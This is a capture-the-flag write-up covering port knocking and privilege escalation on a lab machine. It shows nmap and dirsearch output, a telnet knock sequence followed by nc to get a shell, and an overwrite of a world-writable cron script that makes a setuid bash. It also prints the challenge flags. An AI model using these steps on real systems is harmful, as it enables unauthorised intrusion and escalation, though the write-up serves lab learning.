# Knock knock knocking on shuttles door

## service enumeration

### nmap

quick

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 07:36 EDT
Nmap scan report for 10.6.0.2
Host is up (0.078s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

```

investigating the webserver there doesn't appear to be anything interesting, so I performed a directory bruteforce with the provided wordlist

```
└─$ dirsearch -u http://10.6.0.2/ -e txt -w ~/Documents/rough/hackyholidays/2021/knock_x3_shuttles-door/ChallengeWordlist.txt -r --recursion-depth 2                                                                                   1 ⨯

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt | HTTP method: GET | Threads: 30 | Wordlist size: 998

Output File: /home/kali/.dirsearch/reports/10.6.0.2/_21-07-03_08-00-54.txt

Error Log: /home/kali/.dirsearch/logs/errors-21-07-03_08-00-54.log

Target: http://10.6.0.2/

[08:00:57] Starting: 
[08:01:02] 301 -  309B  - /WhoIsThere  ->  http://10.6.0.2/WhoIsThere/     (Added to queue)
[08:01:03] Starting: WhoIsThere/                            
                                                               
Task Completed

```

we find one directory, /WhoIsThere

navigating to this we find a file with the contents

```
It would be a tcp syn to knock on the doors of air locks:
1337
68
61
78
 
```

this is obviously hinting at port knocking, a technique where if a connection is made to those ports in that order, another port will be opened

flag 1: ctf{1337,68,61,78}

we perform the port knocking with the following technique:



```
telnet 10.6.0.2 1337; telnet 10.6.0.2 68; telnet 10.6.0.2 61; telnet 10.6.0.2 78;
```

I quickly fired off a nmap scan and discovered port 2021 is open. with this found I modified the command and got a shell


```
└─$ telnet 10.6.0.2 1337; telnet 10.6.0.2 68; telnet 10.6.0.2 61; telnet 10.6.0.2 78; nc 10.6.0.2 2021            
Trying 10.6.0.2...
telnet: Unable to connect to remote host: Connection refused
Trying 10.6.0.2...
telnet: Unable to connect to remote host: Connection refused
Trying 10.6.0.2...
telnet: Unable to connect to remote host: Connection refused
Trying 10.6.0.2...
telnet: Unable to connect to remote host: Connection refused
whoami
spaceotter
ls
flag.txt
cat flag.txt
ctf{we_have_lift_off}
```

flag 2: ctf{we_have_lift_off}

### Privilege Escalation

Frustartingly this box did not have curl, wget ,nc or anything else I could use to get an enumeration script on, but thankfully the privesc was relativelly simple
after some brief digging around I found the file `/opt/safetyCheck.sh` which was owned by root and world writable. Looking some more I found a cronjob,
`/etc/cron.d/cronJob` which run the script as the user `control` every minute so simply append a command to make a copy of bash setuid to the script in /opt

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > safetyCheck.sh
```

now in my case the cronjob wasn't running for some reason, after trying a few commands including:

```
service cron restart
service cron force-reload
service cron start
```

it starting running again, which one fixed it? no idea ¯\_(ツ)_/¯

so we get a copy of bash owned by control

```
-rwsr-sr-x 1 control control 1183448 Jul  3 13:10 bash   
```

now simply run it with `-p` to get a shell as control

```
/tmp/bash -p
```

now we can read the flag in control's home directory 

```
cat flag.txt    
ctf{sudoToTheMoon} 
```
